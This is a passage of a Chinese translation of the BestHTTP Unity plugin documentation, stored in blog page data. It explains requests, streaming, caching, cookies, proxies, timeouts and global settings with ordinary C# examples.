(request, response) =&gt; guiTexture.texture = response.DataAsTexture2D).Send();   \n</code></pre><p>除 response.DataAsTexture2D 外，还有一个 response.DataAsText 属性可将响应解码为Utf8字符串。将来可能会添加更多数据解码属性。如果您有任何想法，请自己添加吧.</p>\n<ul>\n<li>5:替换 WWW,使用协程,一般不推荐使用这种方式</li>\n</ul>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com&quot;));\n        request.Send(); \n        yield return StartCoroutine(request); \n        Debug.Log(&quot;Request finished! Downloaded Data:&quot; + request.Response.DataAsText);  \n</code></pre><h2 id=\"高级用法\"><a href=\"#高级用法\" class=\"headerlink\" title=\"高级用法\"></a>高级用法</h2><ul>\n<li>1:methodType,我们将向服务器发送什么样的请求。默认的methodType是HTTPMethods.Get</li>\n<li>2:IsKeepAlive：向服务器指示我们希望tcp连接保持打开状态，因此连续的http请求不需要再次建立连接。如果我们将它保留为默认值true，它可以为我们节省大量时间。如果我们知道我们不会使用通常会将其设置为false的请求。默认值是true。</li>\n<li>3:disableCache：告诉BestHTTP系统使用或完全跳过缓存机制。如果其值为true，则系统不会检查缓存中是否存储了响应，并且也不会保存响应。默认值为false</li>\n<li>4:请求一次:</li>\n</ul>\n<pre><code>        public static void RequestAsyncShort(string url, RequestCallBack callBack)\n        {\n                BestHTTP.HTTPRequest req = new HTTPRequest(new Uri(url), HTTPMethods.Get, \n                (originalRequest, response) =&gt;\n                {\n                        if (originalRequest.State == HTTPRequestStates.Finished)\n                        {\n                        callBack((int) originalRequest.State, response.DataAsText);\n                        }\n                        else\n                        {\n                        callBack((int) originalRequest.State, &quot;&quot;);\n                        }\n                });\n                req.IsKeepAlive = false;\n                req.DisableCache = true;\n                req.Send();\n        }           \n</code></pre><ul>\n<li>5:Best HTTP通过HTTPRequest的Credentials属性支持Basic和Digest身份验证：</li>\n</ul>\n<pre><code>        using BestHTTP.Authentication; \n        var request = new HTTPRequest(new Uri(&quot;http://yourserver.org/auth-path&quot;), (req, resp) =&gt; \n                { \n                        if (resp.StatusCode != 401) \n                                Debug.Log(&quot;Authenticated&quot;); \n                        else \n                                Debug.Log(&quot;NOT Authenticated&quot;); \n                        Debug.Log(resp.DataAsText); \n                }); \n        request.Credentials = new Credentials(&quot;usr&quot;, &quot;paswd&quot;); \n        request.Send();                 \n</code></pre><ul>\n<li>6:下载流媒体(Download Streaming)<br>默认情况下，当完全下载并处理服务器的答案时，我们提供给HTTPRequest的构造函数的回调函数将只调用一次。这样，如果我们想要下载更大的文件，我们就会在移动设备上快速耗尽内存。我们的应用程序会崩溃，用户会对我们生气，应用程序会得到很多不好的评级。理所当然。为了避免这种情况，BestHTTP旨在非常容易地处理这个问题：只需将一个标志(属性)切换为true，每次下载预定义数据量时(指定内存中缓存多少字节量)都会调用我们的回调函数。此外，如果我们没有关闭缓存，下载的响应将被缓存，以便下次我们可以从本地缓存流式传输整个响应，而无需更改我们的代码，甚至无需访问Web服务器。 （备注：服务器必须发送有效的缓存头（“Expires”头：请参阅<a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.21\" target=\"_blank\" rel=\"noopener\">RFC</a>以允许此操作。）</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(new Uri(&quot;http://yourserver.com/bigfile&quot;), (req, resp) =&gt; \n        { \n                List&lt;byte[]&gt; fragments = resp.GetStreamedFragments(); \n                // Write out the downloaded data to a file: \n                using (FileStream fs = new FileStream(&quot;pathToSave&quot;, FileMode.Append)) {\n                        foreach(byte[] data in fragments) fs.Write(data, 0, data.Length); \n                }\n                if (resp.IsStreamingFinished) Debug.Log(&quot;Download finished!&quot;); \n        }); \n        request.UseStreaming = true; \n        request.StreamFragmentSize = 1 * 1024 * 1024; // 1 megabyte\n        request.DisableCache = true; // already saving to a file, so turn off caching request.Send(); \n</code></pre><blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):我们将标志 - UseStreaming - 切换为true，因此我们的回调可能被调用多次。\n    2):StreamFragmentSize指示在调用回调之前我们想要在内存中缓冲的最大数据量。\n    3):每次下载StreamFragmentSize大小的块时都会调用我们的回调，并且当IsStreamingFinished设置为true时再调用一次。\n    4):要获取下载的数据，我们必须使用GetStreamedFragments()函数。我们应该将结果保存在临时变量中，因为在此调用中清除了内部缓冲区(返回字节量,清除内存,写入文件)，因此连续调用将为我们提供null结果。\n    5):我们在此示例中禁用了缓存，因为我们已经保存了下载的缓存,保存在一个磁盘文件中，并且我们不想占用太多空间。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>下载进度</p>\n<pre><code>        var request = new HTTPRequest(new Uri(address), OnFinished); \n        request.OnProgress = OnDownloadProgress; \n        request.Send(); \n        void OnDownloadProgress(HTTPRequest request, int downloaded, int length) \n        { \n                float progressPercent = (downloaded / (float)length) * 100.0f;\n                Debug.Log(&quot;Downloaded: &quot; + progressPercent.ToString(&quot;F2&quot;) + &quot;%&quot;); \n        } \n</code></pre><ul>\n<li>7:上传流媒体(Upload Streaming)<br>使用HTTPRequest对象的UploadStream属性设置上传的数据流Stream。当上传完成并且DisposeUploadStream为true时，插件将调用Stream流上的Dispose()函数。如果流的长度未知，则UseUploadStreamLength属性应设置为false。在这种情况下，插件将使用分块传输编码从流中发送数据:</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnUploadFinished); \n        request.UploadStream = new FileStream(&quot;File_To.Upload&quot;, FileMode.Open); \n        request.Send(); \n</code></pre><p>上传进度回调,要跟踪和显示上传进度，您可以使用HTTPRequest类的OnUploadProgress事件。 OnUploadProgress可以与RawData，表单（通过AddField和AddBinaryData）以及UploadStream一起使用。</p>\n<pre><code>        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(&quot;Field Value&quot;);\n        request.OnUploadProgress = OnUploadProgress; \n        request.Send(); \n        void OnUploadProgress(HTTPRequest request, long uploaded, long length)\n        { \n                float progressPercent = (uploaded / (float)length) * 100.0f;\n                Debug.Log(&quot;Uploaded: &quot; + progressPercent.ToString(&quot;F2&quot;) + &quot;%&quot;); \n        }\n</code></pre><ul>\n<li>8:缓存</li>\n</ul>\n<p>缓存也基于HTTP / 1.1 RFC。它使用标头来存储和验证响应。缓存机制在幕后工作，我们唯一要做的就是决定是否要启用或禁用它。如果缓存的响应具有带有未来日期的“Expires”标头，则BestHTTP将使用缓存的响应，而不对服务器进行验证。这意味着我们不必启动与服务器的任何tcp连接。这可以节省我们的时间，带宽和离线工作。 <strong><em>(这段话的意思相当于本地数据缓存,请求服务器,不会真的连接服务器,会从本地取出原来已经请求过的数据,只要这个数据没有过期,则直接返回给使用者)</em></strong></p>\n<p>虽然缓存是自动的，但我们可以控制它，或者我们可以使用HTTPCacheService类的公共函数获取一些信息：</p>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):BeginClear(),它将开始在单独的线程上清除整个缓存\n    2):BeginMaintainence(),有了这个函数的帮助，我们可以根据上次访问时间删除缓存的条目。它删除上次访问时间早于指定时间的条目。我们还可以使用此函数来控制缓存大小：\n            HTTPCacheService.BeginMaintainence(new HTTPCacheMaintananceParams(TimeSpan.FromDays(14), 50 * 1024 * 1024)); \n    3):GetCacheSize(),将以字节为单位返回缓存的大小。\n    4):GetCacheEntryCount(),将返回缓存中存储的条目数。可以使用float avgSize = GetCacheSize()/（float）GetCacheEntryCount()公式计算平均缓存条目大小。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>9:Cookie ,处理cookie操作对程序员来说是透明的。设置请求Cookie标头以及解析和维护响应的Set-Cookie标头由插件自动完成。有很多关于cookie的Global Settings 。有关详细信息，请参阅 <a href=\"#13\">Global Settings</a> 部分。<br>它可以以各种方式控制</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):使用每一次的请求对象HTTPRequest.IsCookiesEnabled属性以及全局的HTTPManager.IsCookiesEnabled属性来禁用\n    2):可以通过调用CookieJar.Clear()函数从Cookie Jar中删除Cookie\n    3):可以通过响应的Cookies属性访问从服务器发送的新cookie。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>可以通过将Cookie添加到Cookie列表中将Cookie添加到HTTPRequest：</p>\n<pre><code>        var request = new HTTPRequest(new Uri(address), OnFinished);\n        request.Cookies.Add(new Cookie(&quot;Name&quot;, &quot;Value&quot;)); \n        request.Send(); \n</code></pre><p>这些cookie将与服务器发送的cookie合并。如果在请求或HTTPManager中将IsCookiesEnabled设置为false，则仅发送这些用户设置的cookie</p>\n<ul>\n<li>10:代理,HTTPProxy对象可以设置为HTTPRequest的Proxy属性。这样，请求将通过给定的代理。</li>\n</ul>\n<pre><code>        request.Proxy = new HTTPProxy(new Uri(&quot;http://localhost:3128&quot;)); \n</code></pre><p>您也可以设置全局代理，因此您不必手动将其设置为所有请求。请参阅<a href=\"#13\">Global Settings</a>一章</p>\n<ul>\n<li>11:终止请求,您可以通过调用HTTPRequest对象的Abort（）函数来中止正在进行的请求</li>\n</ul>\n<pre><code>        request = new HTTPRequest(new Uri(&quot;http://yourserver.com/bigfile&quot;), (req, resp) =&gt; { ... }); \n        request.Send(); \n        // And after some time: \n        request.Abort(); //将调用回调函数，并且响应对象(resp)将为null。</code></pre><ul>\n<li>12:超时,2 种情况,第一种是:ConnectTimeout,使用此属性，您可以控制等待在应用程序和远程服务器之间建立连接的时间。其默认值为20秒</li>\n</ul>\n<pre><code>        request = new HTTPRequest(new Uri(&quot;http://yourserver.com/&quot;), (req, resp) =&gt; { ... }); \n        request.ConnectTimeout = TimeSpan.FromSeconds(2); \n        request.Send(); \n</code></pre><p>第二种:Timeout 使用此属性，您可以控制等待处理请求的时间（此时已连接到服务器,正在等待服务器响应,发送请求和下载响应）。其默认值为60秒。</p>\n<pre><code>        request = new HTTPRequest(new Uri(&quot;http://yourserver.com/&quot;), (req, resp) =&gt; { ... }); \n        request.Timeout = TimeSpan.FromSeconds(10); \n        request.Send(); \n\n\n\n        string url = &quot;http://besthttp.azurewebsites.net/api/LeaderboardTest?from=0&amp;count=10&quot;; \n        HTTPRequest request = new HTTPRequest(new Uri(url), (req, resp) =&gt; \n        { \n                switch (req.State) \n                { \n                        // The request finished without any problem. \n                        case HTTPRequestStates.Finished: \n                                Debug.Log(&quot;Request Finished Successfully!\\n&quot; + resp.DataAsText); \n                                break; \n                                // The request finished with an unexpected error. \n                        // The request&#39;s Exception property may contain more information about the error. \n                        case HTTPRequestStates.Error: \n                                Debug.LogError(&quot;Request Finished with Error! &quot; + (req.Exception != null ? (req.Exception.Message + &quot;\\n&quot; + req.Exception.StackTrace) : &quot;No Exception&quot;)); \n                        break; \n                        // The request aborted, initiated by the user. \n                        case HTTPRequestStates.Aborted: \n                                Debug.LogWarning(&quot;Request Aborted!&quot;); \n                        break; \n                        // Ceonnecting to the server timed out. \n                        case HTTPRequestStates.ConnectionTimedOut: \n                                Debug.LogError(&quot;Connection Timed Out!&quot;); \n                        break; \n                        // The request didn&#39;t finished in the given time. \n                        case HTTPRequestStates.TimedOut: \n                                Debug.LogError(&quot;Processing the request Timed Out!&quot;); break; \n                } \n        }); \n        // Very little time, for testing purposes: \n        request.ConnectTimeout = TimeSpan.FromMilliseconds(2); \n        request.Timeout = TimeSpan.FromSeconds(5); \n        request.IsKeepAlive = false; \n        request.DisableCache = true; \n        request.Send(); \n</code></pre><ul>\n<li>13:Request States 请求状态,所有请求都有一个包含其内部状态的State属性。可能的状态如下：</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):Initial:请求的初始状态。使用此状态不会调用任何回调\n    2):Queued:在队列中等待处理。使用此状态不会调用任何回调\n    3):Processing:开始处理请求。在此状态下，客户端将发送请求，并解析响应。使用此状态不会调用任何回调。\n    4):Finished:请求完成没有问题。解析完成的响应后，可以使用结果。将使用有效的响应对象调用用户定义的回调。请求的Exception属性将为null。\n    5):Error:请求在插件中以意外错误结束。将使用null响应对象调用用户定义的回调。请求的Exception属性可能包含有关错误的更多信息，但它可以为null。\n    6):Aborted: 请求由客户端中止（HTTPRequest的Abort（）函数）。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n    7):ConnectionTimedOut：连接到服务器超时。将使用null响应调用用户定义的回调。请求的Exception属性将为null。\n    8):TimedOut：请求未在给定时间内完成。将使用null响应调用用户定义的回调。请求的Exception属性将为null。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<ul>\n<li>14:请求的优先级Request Priority ,可以通过HTTPRequest的Priority属性更改请求的优先级。与较低优先级请求相比，将从请求队列中选择更高优先级的请求。</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(new Uri(&quot;https://google.com&quot;), ...);\n        request.Priority = -1; \n        request.Send(); \n</code></pre><ul>\n<li>15:服务器证书验证,Server Certificate  Validation 可以通过实现ICertificateVerifyer接口并将其设置为HTTPRequest的CustomCertificateVerifyer来验证服务器发送的证书：</li>\n</ul>\n<pre><code>        using System; \n        using Org.BouncyCastle.Crypto.Tls; \n        using Org.BouncyCastle.Asn1.X509; \n        class CustomVerifier : ICertificateVerifyer \n        { \n                public bool IsValid(Uri serverUri, X509CertificateStructure[] certs) \n                { \n                // TODO: Return false, if validation fails return true; \n                } \n        } \n        var request = new HTTPRequest(new Uri(&quot;https://google.com&quot;), ...);\n        request.CustomCertificateVerifyer = new CustomVerifier(); \n        request.UseAlternateSSL = true; \n        request.Send(); \n\n</code></pre><ul>\n<li>16:控制重定向,Control Redirections ,重定向由插件自动处理，但有时我们必须在向我们重定向到的uri发出新请求之前进行更改。我们可以在HTTPRequest的OnBeforeRedirection事件处理程序中进行这些更改。在插件向新uri发出新请求之前调用此事件。函数的返回值将控制重定向：如果为false，则重定向将被中止,子线程中调用</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(uri, HTTPMethods.Post); \n        request.AddField(&quot;field&quot;, &quot;data&quot;); \n        request.OnBeforeRedirection += OnBeforeRedirect; \n        request.Send(); \n        bool OnBeforeRedirect(HTTPRequest req, HTTPResponse resp, Uri redirectUri) \n        { \n                if (req.MethodType == HTTPMethods.Post &amp;&amp; resp.StatusCode == 302) \n                { \n                        req.MethodType = HTTPMethods.Get; \n                        // Don&#39;t send more data than needed. \n                        // So we will delete our already processed form data.\n                        req.Clear(); \n                } \n                return true; \n        } </code></pre><ul>\n<li>17:统计(Statistics),您可以使用HTTPManager.GetGeneralStatistics函数获取有关底层插件的一些统计信息：</li>\n</ul>\n<pre><code>        GeneralStatistics stats = HTTPManager.GetGeneralStatistics(StatisticsQueryFlags.All); Debug.Log(stats.ActiveConnections); \n</code></pre><blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):Connections：将返回基于连接的统计信息。这些是以下内容：\n            A:RequestsInQueue：队列中等待空闲连接的请求数。\n            B:Connections：插件跟踪的HTTPConnection实例数。这是以下所有连接的总和\n            B:ActiveConnections：活动连接数。这些连接当前正在处理请求。\n            C:FreeConnections：免费连接数。这些连接完成了请求，他们正在等待另一个请求或回收。\n            D:RecycledConnections：回收连接数。这些连接将尽快删除。\n    2):Cache：基于缓存的统计信息这些是以下内容：\n            A:CacheEntityCount：缓存响应的数量。\n            B:CacheSize：缓存响应的总和大小\n    3):Cookie：基于Cookie的统计信息。这些是以下内容\n            A:CookieCount：Cookie Jar中的Cookie数量\n            B:CookieJarSize：Cookie Jar中Cookie的总和大小</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"Global-Settings\"><a href=\"#Global-Settings\" class=\"headerlink\" title=\"Global Settings\"></a>Global Settings</h2><ul>\n<li>1:使用以下属性，我们可以更改一些默认值，否则应在HTTPRequest的构造函数中指定。因此，大多数这些属性都是节省时间的快捷方式。</li>\n<li>2:这些更改将影响其值更改后创建的所有请求。可以通过HTTPManager类的静态属性更改默认值:</li>\n</ul>\n<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):MaxConnectionPerServer：允许唯一主机的连接数。 http://example.org和https://example.org被视为两个独立的服务器。默认值为4。\n    2):KeepAliveDefaultValue：HTTPRequest的IsKeepAlive属性的默认值。如果IsKeepAlive为false，则将在每个请求之前设置与服务器的tcp连接，并在其之后立即关闭。如果连续请求很少，则应将其更改为false。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n    3):IsCachingDisabled：使用此属性，我们可以全局禁用或启用缓存服务。赋予HTTPRequest构造函数的值将仅覆盖此请求的此值。默认值是true。\n    4):MaxConnectionIdleTime：指定BestHTTP在完成最后一次请求后销毁连接之前应等待的空闲时间。默认值为2分钟。\n    5):IsCookiesEnabled：使用此选项，可以启用或禁用所有Cookie操作。默认值是true。\n    6):CookieJarSize：使用此选项可以控制Cookie存储的大小。默认值为10485760（10 MB）.\n    7):EnablePrivateBrowsing：如果启用此选项，则不会将Cookie写入磁盘。默认值为false\n    8):ConnectTimeout：使用此选项，您可以设置HTTPRequests的默认ConnectTimeout值。默认值为20秒。\n    9):RequestTimeout：使用此选项，您可以设置HTTPRequests.Timeout的默认超时值。默认值为60秒。\n    10):RootCacheFolderProvider：默认情况下，插件会将所有缓存和cookie数据保存在Application.persistentDataPath返回的路径下。您可以为此委托指定一个函数，以返回自定义根路径以定义新路径。这个代理将在子线程上调用！\n    11):Proxy：所有HTTPRequests的全局默认代理。 HTTPRequest的代理仍然可以按请求进行更改。默认值为null\n    12):Logger：ILogger实现，能够控制将记录有关插件内部的信息，以及如何记录这些信息\n    13):DefaultCertificateVerifyer：可以将ICertificateVerifyer实现设置为此属性。之后创建的所有新请求将在使用安全协议且请求的UseAlternateSSL为true时使用此验证程序。 ICertificateVerifyer实现可用于实现服务器证书验证。\n    14):UseAlternateSSLDefaultValue：可以通过此属性更改HTTPRequest的UseAlternateSSL的默认值。\n    15):HTTPManager.MaxConnectionPerServer = 10; HTTPManager.RequestTimeout = TimeSpan.FromSeconds(120); </code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"关于线程\"><a href=\"#关于线程\" class=\"headerlink\" title=\"关于线程\"></a>关于线程</h2><ul>\n<li>1:因为插件内部使用线程并行处理所有请求，所以所有共享资源（缓存，cookie等）都是在设计和实现线程安全时考虑的。</li>\n<li>2:调用请求的回调函数和所有其他回调（如WebSocket的回调）都是在Unity的主线程上回调（如Unity的事件：awake, start, update, etc），因此您不必进行任何线程同步。</li>\n<li>3:在多个线程上创建，发送请求也是安全的，但是你应该调用BestHTTP.HTTPManager.Setup();在从Unity的一个事件（例如，awake，start）发送任何请求之前发挥作用。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"BestHttp-文档翻译\"><a href=\"#BestHttp-文档翻译\" class=\"headerlink\" title=\"BestHttp 文档翻译\"></a>BestHttp 文档翻译</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p><a href=\"https://www.assetstore.unity3d.com/en/#!/content/10872\" target=\"_blank\" rel=\"noopener\">BestHTTP</a> 是基于 <a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616.html\" target=\"_blank\" rel=\"noopener\">RFC 2616</a> 的 HTTP/1.1 实现 , 它支持几乎所有Unity移动和独立平台 (请参阅 <a href=\"#15\">Supported platforms</a>). </p>\n<p>我的目标是为Unity创建一个易于使用但功能强大的插件，以利用HTTP / 1.1中的潜力.    本文档是一个快速指南，并非所有功能和属性都可以在这里找到. 如需支持，功能请求或一般性问题，您可以发送电子邮件至<a href=\"mailto:besthttp@gmail.com\">besthttp@gmail.com</a>.</p>\n<h2 id=\"快速入门\"><a href=\"#快速入门\" class=\"headerlink\" title=\"快速入门\"></a>快速入门</h2><ul>\n<li>1:使用头文件.本文档中的所有示例都没有任何错误检查！在编写时，请确保添加一些空检查</li>\n</ul>\n<pre><code>        using BestHTTP;     \n</code></pre><ul>\n<li>2:GET 请求,向Web服务器发出请求的最简单方法是创建一个HTTPRequest对象，为其构造函数提供url和回调函数.在我们构造一个新的HTTPRequest对象后，我们唯一需要做的就是使用Send()函数发送请求.</li>\n</ul>\n<pre><code>\n        {\n                HTTPRequest request = new HTTPRequest(new Uri(&quot;https://google.com&quot;), OnRequestFinished); request.Send(); \n\n                new HTTPRequest(new Uri(&quot;https://google.com&quot;), (request, response) =&gt; Debug.Log(&quot;Finished!&quot;)).Send(); \n        }\n        void OnRequestFinished(HTTPRequest request, HTTPResponse response) \n        {    \n                Debug.Log(&quot;Request Finished! Text received: &quot; + response.DataAsText); \n        }      \n</code></pre><p>回调函数始终接收原始HTTPRequest对象和保存服务器响应的HTTPResponse对象。如果出现错误，则HTTPResponse对象为null,需要自己判断,并且请求对象具有Exception属性,该属性可能包含有关错误的额外信息(如果有).<br>虽然请求总是在不同的线程上处理，但调用回调函数已完成Unity的主线程，所以我们不必做任何线程同步。</p>\n<ul>\n<li>3:其他请求 上面的例子是简单的GET请求。如果我们没有指定方法，默认情况下所有请求都将是GET请求。构造函数具有另一个参数，可用于指定请求的方法.</li>\n</ul>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Post, OnRequestFinished); \n        request.AddField(&quot;FieldName&quot;, &quot;Field Value&quot;); \n        request.Send();         \n</code></pre><p>要在不设置字段的情况下POST任何数据，可以使用RawData属性</p>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Post, OnRequestFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(&quot;Field Value&quot;); \n        request.Send();         \n</code></pre><p>有关其他样品，请查看<a href=\"#14\">Small Code-Samples</a>部分。</p>\n<p>除了GET和POST之外，您还可以使用 <strong><em>HEAD，PUT，DELETE，PATCH</em></strong>  方法:</p>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Head, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Put, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Delete, OnRequestFinished); \n        request.Send(); \n\n        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com/path&quot;), HTTPMethods.Patch, OnRequestFinished); \n        request.Send(); \n</code></pre><ul>\n<li>4:如何使用下载的数据?可以从HTTPResponse对象的Data属性访问原始字节。我们来看一个如何下载图像的例子:</li>\n</ul>\n<pre><code>        new HTTPRequest(new Uri(&quot;http://yourserver.com/path/to/image.png&quot;), (request, response) =&gt; \n                { \n                        var tex = new Texture2D(0, 0); \n                        tex.LoadImage(response.Data); \n                        guiTexture.texture = tex; \n                }).Send(); \n\n        new HTTPRequest(new Uri(&quot;http://yourserver.com/path/to/image.png&quot;),\n        (request, response) =&gt; guiTexture.texture = response.DataAsTexture2D).Send();   \n</code></pre><p>除 response.DataAsTexture2D 外，还有一个 response.DataAsText 属性可将响应解码为Utf8字符串。将来可能会添加更多数据解码属性。如果您有任何想法，请自己添加吧.</p>\n<ul>\n<li>5:替换 WWW,使用协程,一般不推荐使用这种方式</li>\n</ul>\n<pre><code>        HTTPRequest request = new HTTPRequest(new Uri(&quot;http://server.com&quot;));\n        request.Send(); \n        yield return StartCoroutine(request); \n        Debug.Log(&quot;Request finished! Downloaded Data:&quot; + request.Response.DataAsText);  \n</code></pre><h2 id=\"高级用法\"><a href=\"#高级用法\" class=\"headerlink\" title=\"高级用法\"></a>高级用法</h2><ul>\n<li>1:methodType,我们将向服务器发送什么样的请求。默认的methodType是HTTPMethods.Get</li>\n<li>2:IsKeepAlive：向服务器指示我们希望tcp连接保持打开状态，因此连续的http请求不需要再次建立连接。如果我们将它保留为默认值true，它可以为我们节省大量时间。如果我们知道我们不会使用通常会将其设置为false的请求。默认值是true。</li>\n<li>3:disableCache：告诉BestHTTP系统使用或完全跳过缓存机制。如果其值为true，则系统不会检查缓存中是否存储了响应，并且也不会保存响应。默认值为false</li>\n<li>4:请求一次:</li>\n</ul>\n<pre><code>        public static void RequestAsyncShort(string url, RequestCallBack callBack)\n        {\n                BestHTTP.HTTPRequest req = new HTTPRequest(new Uri(url), HTTPMethods.Get, \n                (originalRequest, response) =&gt;\n                {\n                        if (originalRequest.State == HTTPRequestStates.Finished)\n                        {\n                        callBack((int) originalRequest.State, response.DataAsText);\n                        }\n                        else\n                        {\n                        callBack((int) originalRequest.State, &quot;&quot;);\n                        }\n                });\n                req.IsKeepAlive = false;\n                req.DisableCache = true;\n                req.Send();\n        }           \n</code></pre><ul>\n<li>5:Best HTTP通过HTTPRequest的Credentials属性支持Basic和Digest身份验证：</li>\n</ul>\n<pre><code>        using BestHTTP.Authentication; \n        var request = new HTTPRequest(new Uri(&quot;http://yourserver.org/auth-path&quot;), (req, resp) =&gt; \n                { \n                        if (resp.StatusCode != 401) \n                                Debug.Log(&quot;Authenticated&quot;); \n                        else \n                                Debug.Log(&quot;NOT Authenticated&quot;); \n                        Debug.Log(resp.DataAsText); \n                }); \n        request.Credentials = new Credentials(&quot;usr&quot;, &quot;paswd&quot;); \n        request.Send();                 \n</code></pre><ul>\n<li>6:下载流媒体(Download Streaming)<br>默认情况下，当完全下载并处理服务器的答案时，我们提供给HTTPRequest的构造函数的回调函数将只调用一次。这样，如果我们想要下载更大的文件，我们就会在移动设备上快速耗尽内存。我们的应用程序会崩溃，用户会对我们生气，应用程序会得到很多不好的评级。理所当然。为了避免这种情况，BestHTTP旨在非常容易地处理这个问题：只需将一个标志(属性)切换为true，每次下载预定义数据量时(指定内存中缓存多少字节量)都会调用我们的回调函数。此外，如果我们没有关闭缓存，下载的响应将被缓存，以便下次我们可以从本地缓存流式传输整个响应，而无需更改我们的代码，甚至无需访问Web服务器。 （备注：服务器必须发送有效的缓存头（“Expires”头：请参阅<a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.21\" target=\"_blank\" rel=\"noopener\">RFC</a>以允许此操作。）</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(new Uri(&quot;http://yourserver.com/bigfile&quot;), (req, resp) =&gt; \n        { \n                List&lt;byte[]&gt; fragments = resp.GetStreamedFragments(); \n                // Write out the downloaded data to a file: \n                using (FileStream fs = new FileStream(&quot;pathToSave&quot;, FileMode.Append)) {\n                        foreach(byte[] data in fragments) fs.Write(data, 0, data.Length); \n                }\n                if (resp.IsStreamingFinished) Debug.Log(&quot;Download finished!&quot;); \n        }); \n        request.UseStreaming = true; \n        request.StreamFragmentSize = 1 * 1024 * 1024; // 1 megabyte\n        request.DisableCache = true; // already saving to a file, so turn off caching request.Send(); \n</code></pre><blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>    1):我们将标志 - UseStreaming - 切换为true，因此我们的回调可能被调用多次。\n    2):StreamFragmentSize指示在调用回调之前我们想要在内存中缓冲的最大数据量。\n    3):每次下载StreamFragmentSize大小的块时都会调用我们的回调，并且当IsStreamingFinished设置为true时再调用一次。\n    4):要获取下载的数据，我们必须使用GetStreamedFragments()函数。我们应该将结果保存在临时变量中，因为在此调用中清除了内部缓冲区(返回字节量,清除内存,写入文件)，因此连续调用将为我们提供null结果。\n    5):我们在此示例中禁用了缓存，因为我们已经保存了下载的缓存,保存在一个磁盘文件中，并且我们不想占用太多空间。</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>下载进度</p>\n<pre><code>        var request = new HTTPRequest(new Uri(address), OnFinished); \n        request.OnProgress = OnDownloadProgress; \n        request.Send(); \n        void OnDownloadProgress(HTTPRequest request, int downloaded, int length) \n        { \n                float progressPercent = (downloaded / (float)length) * 100.0f;\n                Debug.Log(&quot;Downloaded: &quot; + progressPercent.ToString(&quot;F2&quot;) + &quot;%&quot;); \n        } \n</code></pre><ul>\n<li>7:上传流媒体(Upload Streaming)<br>使用HTTPRequest对象的UploadStream属性设置上传的数据流Stream。当上传完成并且DisposeUploadStream为true时，插件将调用Stream流上的Dispose()函数。如果流的长度未知，则UseUploadStreamLength属性应设置为false。在这种情况下，插件将使用分块传输编码从流中发送数据:</li>\n</ul>\n<pre><code>        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnUploadFinished); \n        request.UploadStream = new FileStream(&quot;File_To.Upload&quot;, FileMode.Open); \n        request.Send(); \n</code></pre><p>上传进度回调,要跟踪和显示上传进度，您可以使用HTTPRequest类的OnUploadProgress事件。 OnUploadProgress可以与RawData，表单（通过AddField和AddBinaryData）以及UploadStream一起使用。</p>\n<pre><code>        var request = new HTTPRequest(new Uri(address), HTTPMethods.Post, OnFinished); \n        request.RawData =  Encoding.UTF8.GetBytes(&quot;Field Value&quot;);\n        request.OnUploadProgress = OnUploadProgress; \n        request.Send(); \n        void OnUploadProgress(HTTPRequest request, long uploaded, long length)\n        { \n                float progressPercent = (uploaded / (float)length) * 100.0f;\n                Debug.Log(&quot;Uploaded: &quot; + progressPercent.ToString(&quot;F2&quot;) + &quot;%&quot;); \n        }\n</code></pre><ul>\n<li>8:缓存</li>\n</ul>\n<p>缓存也基于HTTP / 1.1 RFC。它使用标头来存储和验证响应。缓存机制在幕后工作，我们唯一要做的就是决定是否要启用或禁用它。如果缓存的响应具有带有未来日期的“Expires”标头，则BestHTTP将使用缓存的响应，而不对服务器进行验证。这意味着我们不必启动与服务器的任何tcp连接。这可以节省我们的时间，带宽和离线工作。 